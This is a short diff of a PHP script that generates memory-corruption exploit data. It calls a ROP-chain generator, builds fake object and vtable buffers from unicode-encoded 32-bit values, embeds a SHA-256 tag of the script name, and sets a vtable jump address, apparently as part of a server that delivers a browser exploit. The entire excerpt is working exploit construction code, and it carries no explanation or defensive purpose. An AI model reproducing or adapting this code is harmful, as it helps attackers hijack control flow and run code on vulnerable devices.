@@ -39,24 +39,12 @@ for($i=0; $i<7; $i++)
 }
 $OBJECTDATA_OVERWRITE .= "\"";
 
-//$OBJECTDATA_OVERWRITE = "\"\u6004\u08b6\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\"";
-
 generate_ropchain();
 
-$tag = hash("sha256", $_SERVER['SCRIPT_NAME'], true);
-$OBJECTDATA_PADDING = "\"" . genu32_unicode(0xF7F7F7F0);
-$OBJECTDATA_PADDING .= genu32_unicode(0xF7F7F7F7);
-$OBJECTDATA_PADDING .= genu32_unicode(0xF7F7F7F7);
-$OBJECTDATA_PADDING .= genu32_unicode(0xF7F7F7F7);
-$OBJECTDATA_PADDING .= genu32_unicode(0xF7F7F7F7);
-for($i=0; $i<2; $i++)
-{
-	for($hashi=0; $hashi<0x20; $hashi+=4)$OBJECTDATA_PADDING .= genu32_unicode(ord($tag[$hashi]) | (ord($tag[$hashi+1])<<8) | (ord($tag[$hashi+2])<<16) | (ord($tag[$hashi+1])<<24));
-}
-$OBJECTDATA_PADDING .= genu32_unicode(0xF4F7F7F7) . "\"";
-
 $VTABLEDATA = "\"";
-for($i=0; $i<(0x110>>2); $i++)$VTABLEDATA .= genu32_unicode(0x11223344);
+for($i=0; $i<((0x110-0x20)>>2); $i++)$VTABLEDATA .= genu32_unicode(0x11223344);
+$tag = hash("sha256", $_SERVER['SCRIPT_NAME'], true);
+for($hashi=0; $hashi<0x20; $hashi+=4)$VTABLEDATA .= genu32_unicode(ord($tag[$hashi]) | (ord($tag[$hashi+1])<<8) | (ord($tag[$hashi+2])<<16) | (ord($tag[$hashi+1])<<24));
 $VTABLEDATA .= genu32_unicode($VTABLE_JUMPADR);
 $VTABLEDATA .= "\"";
 
